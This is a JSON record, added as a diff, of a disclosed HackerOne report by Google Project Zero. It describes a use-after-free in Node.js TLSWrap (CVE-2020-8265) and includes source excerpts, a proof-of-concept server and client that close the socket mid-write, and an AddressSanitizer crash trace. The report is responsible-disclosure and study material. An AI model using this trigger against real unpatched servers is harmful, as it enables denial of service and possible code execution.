@@ -1,0 +1,138 @@
+{
+  "id": 988103,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85ODgxMDM=",
+  "url": "https://hackerone.com/reports/988103",
+  "title": "Node.js: use-after-free in TLSWrap",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2020-09-22T12:49:41.090Z",
+  "submitted_at": "2020-09-22T12:49:41.135Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "fwilhelm",
+    "url": "/fwilhelm",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 22984,
+    "url": "https://hackerone.com/nodejs",
+    "handle": "nodejs",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js",
+      "twitter_handle": "nodejs",
+      "website": "https://nodejs.org",
+      "about": "The Node.js JavaScript Runtime"
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2020-8265"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2021-01-05T08:18:06.740Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-01-05T08:18:06.666Z",
+  "team_member_agreed_on_going_public_at": "2021-01-04T19:53:32.902Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Node.js: use-after-free in TLSWrap\n\nNode v14.11.0 (Current) is vulnerable to a use-after-free bug in its TLS implementation.\nWhen writing to a TLS enabled socket, node::StreamBase::Write calls node::TLSWrap::DoWrite\nwith a freshly allocated WriteWrap object as first argument. If the DoWrite method\ndoes not return an error, this object is passed back to the caller as part of a \nStreamWriteResult structure:\n  // stream_base-inl.h\n  WriteWrap* req_wrap = CreateWriteWrap(req_wrap_obj);\n\n  err = DoWrite(req_wrap, bufs, count, send_handle);\n  bool async = err == 0;\n\n  if (!async) {\n    req_wrap->Dispose();\n    req_wrap = nullptr;\n  }\n\n  const char* msg = Error();\n  if (msg != nullptr) {\n    req_wrap_obj->Set(env->context(),\n                      env->error_string(),\n                      OneByteString(env->isolate(), msg)).Check();\n    ClearError();\n  }\n\n  return StreamWriteResult { async, err, req_wrap, total_bytes };\n\nThe problem is that TLSWrap::DoWrite can trigger a free of the WriteWrap object \nwithout returning an error when the EncOut() call at the end of the DoWrite method fails.\nEncOut() calls underlying_stream()->Write() to write TLS encrypted data to the network socket.\nIf this write fails, InvokeQueued() is called and the function returns immediately:\n\n  // tls_wrap.cc\n  // Write any encrypted/handshake output that may be ready.\n  // Guard against sync call of current_write_->Done(), its unsupported.\n  in_dowrite_ = true;\n  EncOut();\n  in_dowrite_ = false;\n\n  return 0;\n\n  // tls_wrap.cc\n  void TLSWrap::EncOut() {\n  [...]\n\n  Debug(this, \"Writing %zu buffers to the underlying stream\", count);\n  StreamWriteResult res = underlying_stream()->Write(bufs, count);\n  if (res.err != 0) {\n    InvokeQueued(res.err);\n    return;\n  }\n  [..]\n\nInvokeQueued() triggers an immediate free of the req_wrap WriteWrap* object via the\nfollowing call chain: \nnode::TLSWrap::InvokeQueued -> node::StreamReq::Done -> node::WriteWrap::OnDone\n-> node::StreamReq::Dispose -> node::BaseObjectPtrImpl<node::AsyncWrap, false>::~BaseObjectPtrImpl()\n-> node::BaseObject::decrease_refcount() -> node::SimpleWriteWrap<node::AsyncWrap>::~SimpleWriteWrap()\n\nMaking underlying_stream()->Write fail is as easy as closing the socket at the other side \nof the connection just before the write to trigger a broken pipe error. \n\nBecause node::TLSWrap::DoWrite doesn't return an error code, node::StreamBase::Write will return \nthe freed WriteWrap object as part of its StreamWriteResult. For calls by node::StreamBase::WriteV, \nthis will immediately trigger a use-after-free when the SetAllocatedStorage() method \nis called on the freed object:\n\n  // stream_base.cc\n  StreamWriteResult res = Write(*bufs, count, nullptr, req_wrap_obj);\n  SetWriteResult(res);\n  if (res.wrap != nullptr && storage_size > 0) {\n    res.wrap->SetAllocatedStorage(std::move(storage));\n  }\n\nThe bug can be easily triggered against a simple node HTTPS server application. Under normal \ncircumstances and without an ASAN enabled build, the UAF doesn't trigger a crash on Linux \nas the freed memory  won't get reallocated in time and the write in SetAllocatedStorage \ncorrupts chunk metadata  that isn't used for small chunks. \nI think this is the only reason why the bug wasn't spotted earlier, as the broken pipe error path should be hit \npretty often in the real world. However, this issue might still be exploitable with the right heap layout \n(if the WriteWrap chunk is merged with a larger chunk during the free), different heap implementations \nand/or some other control flow that allows to allocate something before the reuse. \n\nProof-of-Concept:\n\nserver.js:\n```\nconst https = require('https');\n\nconst key = `-----BEGIN EC PARAMETERS-----\nBggqhkjOPQMBBw==\n-----END EC PARAMETERS-----\n-----BEGIN EC PRIVATE KEY-----\nMHcCAQEEIDKfHHbiJMdu2STyHL11fWC7psMY19/gUNpsUpkwgGACoAoGCCqGSM49\nAwEHoUQDQgAEItqm+pYj3Ca8bi5mBs+H8xSMxuW2JNn4I+kw3aREsetLk8pn3o81\nPWBiTdSZrGBGQSy+UAlQvYeE6Z/QXQk8aw==\n-----END EC PRIVATE KEY-----`\n\nconst cert = `-----BEGIN CERTIFICATE-----\nMIIBhjCCASsCFDJU1tCo88NYU//pE+DQKO9hUDsFMAoGCCqGSM49BAMCMEUxCzAJ\nBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5l\ndCBXaWRnaXRzIFB0eSBMdGQwHhcNMjAwOTIyMDg1NDU5WhcNNDgwMjA3MDg1NDU5\nWjBFMQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwY\nSW50ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcD\nQgAEItqm+pYj3Ca8bi5mBs+H8xSMxuW2JNn4I+kw3aREsetLk8pn3o81PWBiTdSZ\nrGBGQSy+UAlQvYeE6Z/QXQk8azAKBggqhkjOPQQDAgNJADBGAiEA7Bdn4F87KqIe\nY/ABy/XIXXpFUb2nyv3zV7POQi2lPcECIQC3UWLmfiedpiIKsf9YRIyO0uEood7+\nglj2R1NNr1X68w==\n-----END CERTIFICATE-----`\n\nconst options = {\n  key: key,\n  cert: cert,\n};\n\nhttps.createServer(options, function (req, res) {\n  res.writeHead(200);\n  res.end(\"hello world\\n\");\n}).listen(4444);\n```\n---\n\npoc.js:\n```\nconst tls = require('tls')\n\nvar socket = tls.connect(4444, 'localhost', {rejectUnauthorized : false}, () => {\n  console.log(\"connected\")\n  socket.write(\"GET / HTTP/1.1\\r\\nHost: localhost\\r\\nConnection: Keep-alive\\r\\n\\r\\n\")\n  socket.write(\"GET / HTTP/1.1\\r\\nHost: localhost\\r\\nConnection: Keep-alive\\r\\n\\r\\n\")\n  socket.write(\"GET / HTTP/1.1\\r\\nHost: localhost\\r\\nConnection: Keep-alive\\r\\n\\r\\n\")\n})\n\n\nsocket.on('data', () => {\n  socket.destroy()\n})  \n```\n\n\n\n\n\nThe POC triggers a crash when server.js is run on an ASAN enabled build of node.js: \n```\n==1408671==ERROR: AddressSanitizer: heap-use-after-free on address 0x608000011138 at pc 0x0000011929b6 bp 0x7ffc8c2243f0 sp 0x7ffc8c2243e8\nREAD of size 8 at 0x608000011138 thread T0\n    #0 0x11929b5 in std::__uniq_ptr_impl<v8::BackingStore, std::default_delete<v8::BackingStore> >::_M_ptr() const /usr/bin/../lib/gcc/x86_64-linux-gnu/9/../../../../include/c++/9/bits/unique_ptr.h:154:42\n    #1 0x1192974 in std::unique_ptr<v8::BackingStore, std::default_delete<v8::BackingStore> >::get() const /usr/bin/../lib/gcc/x86_64-linux-gnu/9/../../../../include/c++/9/bits/unique_ptr.h:361:21\n    #2 0x1193fb4 in std::unique_ptr<v8::BackingStore, std::default_delete<v8::BackingStore> >::operator bool() const /usr/bin/../lib/gcc/x86_64-linux-gnu/9/../../../../include/c++/9/bits/unique_ptr.h:375:16\n    #3 0x1190415 in node::AllocatedBuffer::data() /pwd/out/../src/allocated_buffer-inl.h:79:8\n    #4 0x16f8a79 in node::WriteWrap::SetAllocatedStorage(node::AllocatedBuffer&&) /pwd/out/../src/stream_base-inl.h:247:3\n    #5 0x16f1141 in node::StreamBase::Writev(v8::FunctionCallbackInfo<v8::Value> const&) /pwd/out/../src/stream_base.cc:172:15\n    #6 0x16faa47 in void node::StreamBase::JSMethod<&(node::StreamBase::Writev(v8::FunctionCallbackInfo<v8::Value> const&))>(v8::FunctionCallbackInfo<v8::Value> const&) /pwd/out/../src/stream_base.cc:468:29\n    #7 0x1caf642 in v8::internal::FunctionCallbackArguments::Call(v8::internal::CallHandlerInfo) /pwd/out/../deps/v8/src/api/api-arguments-inl.h:158:3\n    #8 0x1cabfaf in v8::internal::MaybeHandle<v8::internal::Object> v8::internal::(anonymous namespace)::HandleApiCallHelper<false>(v8::internal::Isolate*, v8::internal::Handle<v8::internal::HeapObject>, v8::internal::Handle<v8::internal::HeapObject>, v8::internal::Handle<v8::internal::FunctionTemplateInfo>, v8::internal::Handle<v8::internal::Object>, v8::internal::BuiltinArguments) /pwd/out/../deps/v8/src/builtins/builtins-api.cc:111:36\n    #9 0x1ca8f8a in v8::internal::Builtin_Impl_HandleApiCall(v8::internal::BuiltinArguments, v8::internal::Isolate*) /pwd/out/../deps/v8/src/builtins/builtins-api.cc:141:5\n    #10 0x1ca81e0 in v8::internal::Builtin_HandleApiCall(int, unsigned long*, v8::internal::Isolate*) /pwd/out/../deps/v8/src/builtins/builtins-api.cc:129:1\n    #11 0x3e096df in Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_BuiltinExit (/p0/node/node-v14.11.0/out/Debug/node+0x3e096df)\n\n0x608000011138 is located 24 bytes inside of 88-byte region [0x608000011120,0x608000011178)\nfreed by thread T0 here:\n    #0 0xe79b1d in operator delete(void*) (/p0/node/node-v14.11.0/out/Debug/node+0xe79b1d)\n    #1 0x1707177 in node::SimpleWriteWrap<node::AsyncWrap>::~SimpleWriteWrap() /pwd/out/../src/stream_base.h:418:7\n    #2 0xf943be in node::BaseObject::decrease_refcount() /pwd/out/../src/base_object-inl.h:203:7\n    #3 0x10886e6 in node::BaseObjectPtrImpl<node::AsyncWrap, false>::~BaseObjectPtrImpl() /pwd/out/../src/base_object-inl.h:248:12\n    #4 0x13c2a3c in node::StreamReq::Dispose() /pwd/out/../src/stream_base-inl.h:40:1\n    #5 0x16f794c in node::WriteWrap::OnDone(int) /pwd/out/../src/stream_base.cc:591:3\n    #6 0x10e71f8 in node::StreamReq::Done(int, char const*) /pwd/out/../src/stream_base-inl.h:261:3\n    #7 0x1921f95 in node::TLSWrap::InvokeQueued(int, char const*) /pwd/out/../src/tls_wrap.cc:101:8\n    #8 0x1927f39 in node::TLSWrap::EncOut() /pwd/out/../src/tls_wrap.cc:356:5\n    #9 0x192e258 in node::TLSWrap::DoWrite(node::WriteWrap*, uv_buf_t*, unsigned long, uv_stream_s*) /pwd/out/../src/tls_wrap.cc:820:3\n    #10 0x13b50dd in node::StreamBase::Write(uv_buf_t*, unsigned long, uv_stream_s*, v8::Local<v8::Object>) /pwd/out/../src/stream_base-inl.h:193:9\n    #11 0x16f108f in node::StreamBase::Writev(v8::FunctionCallbackInfo<v8::Value> const&) /pwd/out/../src/stream_base.cc:169:27\n    #12 0x16faa47 in void node::StreamBase::JSMethod<&(node::StreamBase::Writev(v8::FunctionCallbackInfo<v8::Value> const&))>(v8::FunctionCallbackInfo<v8::Value> const&) /pwd/out/../src/stream_base.cc:468:29\n    #13 0x1caf642 in v8::internal::FunctionCallbackArguments::Call(v8::internal::CallHandlerInfo) /pwd/out/../deps/v8/src/api/api-arguments-inl.h:158:3\n    #14 0x1cabfaf in v8::internal::MaybeHandle<v8::internal::Object> v8::internal::(anonymous namespace)::HandleApiCallHelper<false>(v8::internal::Isolate*, v8::internal::Handle<v8::internal::HeapObject>, v8::internal::Handle<v8::internal::HeapObject>, v8::internal::Handle<v8::internal::FunctionTemplateInfo>, v8::internal::Handle<v8::internal::Object>, v8::internal::BuiltinArguments) /pwd/out/../deps/v8/src/builtins/builtins-api.cc:111:36\n    #15 0x1ca8f8a in v8::internal::Builtin_Impl_HandleApiCall(v8::internal::BuiltinArguments, v8::internal::Isolate*) /pwd/out/../deps/v8/src/builtins/builtins-api.cc:141:5\n    #16 0x1ca81e0 in v8::internal::Builtin_HandleApiCall(int, unsigned long*, v8::internal::Isolate*) /pwd/out/../deps/v8/src/builtins/builtins-api.cc:129:1\n    #17 0x3e096df in Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_BuiltinExit (/p0/node/node-v14.11.0/out/Debug/node+0x3e096df)\n \npreviously allocated by thread T0 here:\n    #0 0xe792bd in operator new(unsigned long) (/p0/node/node-v14.11.0/out/Debug/node+0xe792bd)\n    #1 0x16f81c2 in node::StreamBase::CreateWriteWrap(v8::Local<v8::Object>) /pwd/out/../src/stream_base.cc:629:10\n    #2 0x13b4fb0 in node::StreamBase::Write(uv_buf_t*, unsigned long, uv_stream_s*, v8::Local<v8::Object>) /pwd/out/../src/stream_base-inl.h:191:25\n    #3 0x16f108f in node::StreamBase::Writev(v8::FunctionCallbackInfo<v8::Value> const&) /pwd/out/../src/stream_base.cc:169:27\n    #4 0x16faa47 in void node::StreamBase::JSMethod<&(node::StreamBase::Writev(v8::FunctionCallbackInfo<v8::Value> const&))>(v8::FunctionCallbackInfo<v8::Value> const&) /pwd/out/../src/stream_base.cc:468:29\n    #5 0x1caf642 in v8::internal::FunctionCallbackArguments::Call(v8::internal::CallHandlerInfo) /pwd/out/../deps/v8/src/api/api-arguments-inl.h:158:3\n    #6 0x1cabfaf in v8::internal::MaybeHandle<v8::internal::Object> v8::internal::(anonymous namespace)::HandleApiCallHelper<false>(v8::internal::Isolate*, v8::internal::Handle<v8::internal::HeapObject>, v8::internal::Handle<v8::internal::HeapObject>, v8::internal::Handle<v8::internal::FunctionTemplateInfo>, v8::internal::Handle<v8::internal::Object>, v8::internal::BuiltinArguments) /pwd/out/../deps/v8/src/builtins/builtins-api.cc:111:36\n    #7 0x1ca8f8a in v8::internal::Builtin_Impl_HandleApiCall(v8::internal::BuiltinArguments, v8::internal::Isolate*) /pwd/out/../deps/v8/src/builtins/builtins-api.cc:141:5\n    #8 0x1ca81e0 in v8::internal::Builtin_HandleApiCall(int, unsigned long*, v8::internal::Isolate*) /pwd/out/../deps/v8/src/builtins/builtins-api.cc:129:1\n    #9 0x3e096df in Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_BuiltinExit (/p0/node/node-v14.11.0/out/Debug/node+0x3e096df)\n    #10 0x3c06181 in Builtins_InterpreterEntryTrampoline (/p0/node/node-v14.11.0/out/Debug/node+0x3c06181)\n    #11 0x3c06181 in Builtins_InterpreterEntryTrampoline (/p0/node/node-v14.11.0/out/Debug/node+0x3c06181)\n   \n\nSUMMARY: AddressSanitizer: heap-use-after-free /usr/bin/../lib/gcc/x86_64-linux-gnu/9/../../../../include/c++/9/bits/unique_ptr.h:154:42 in std::__uniq_ptr_impl<v8::BackingStore, std::default_delete<v8::BackingStore> >::_M_ptr() const\nShadow bytes around the buggy address:\n  0x0c107fffa1d0: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd\n  0x0c107fffa1e0: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd\n  0x0c107fffa1f0: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd\n  0x0c107fffa200: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 fa\n  0x0c107fffa210: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd\n=>0x0c107fffa220: fa fa fa fa fd fd fd[fd]fd fd fd fd fd fd fd fa\n  0x0c107fffa230: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd\n  0x0c107fffa240: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd\n  0x0c107fffa250: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd\n  0x0c107fffa260: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd\n  0x0c107fffa270: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd\nShadow byte legend (one shadow byte represents 8 application bytes):\n  Addressable:           00\n  Partially addressable: 01 02 03 04 05 06 07\n  Heap left redzone:       fa\n  Freed heap region:       fd\n  Stack left redzone:      f1\n  Stack mid redzone:       f2\n  Stack right redzone:     f3\n  Stack after return:      f5\n  Stack use after scope:   f8\n  Global redzone:          f9\n  Global init order:       f6\n  Poisoned by user:        f7\n  Container overflow:      fc\n  Array cookie:            ac\n  Intra object redzone:    bb\n  ASan internal:           fe\n  Left alloca redzone:     ca\n  Right alloca redzone:    cb\n  Shadow gap:              cc\n==1408671==ABORTING\n```\n\nCredits: \nFelix Wilhelm of Google Project Zero\n\nThis bug is subject to a 90 day disclosure deadline. After 90 days elapse, the bug report \nwill become visible to the public. The scheduled disclosure date is 2020-12-21. \nDisclosure at an earlier date is also possible if agreed upon by all parties.\n\n## Impact\n\nRemote code execution",
+  "weakness": {
+    "id": 50,
+    "name": "Use After Free"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2021-02-03T19:53:33.034Z",
+  "allow_singular_disclosure_after": -165957725.06363007,
+  "singular_disclosure_allowed": true,
+  "vote_count": 27,
+  "voters": [
+    "eitans",
+    "th4nu_0x0",
+    "salahhasoneh",
+    "p0wn4j",
+    "demonia",
+    "hakivvi",
+    "hexagr",
+    "jacin",
+    "floki0400",
+    "boomer0302",
+    "and 17 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 7.5,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "none",
+      "integrity": "low",
+      "availability": "low"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 666,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/nodejs/node",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
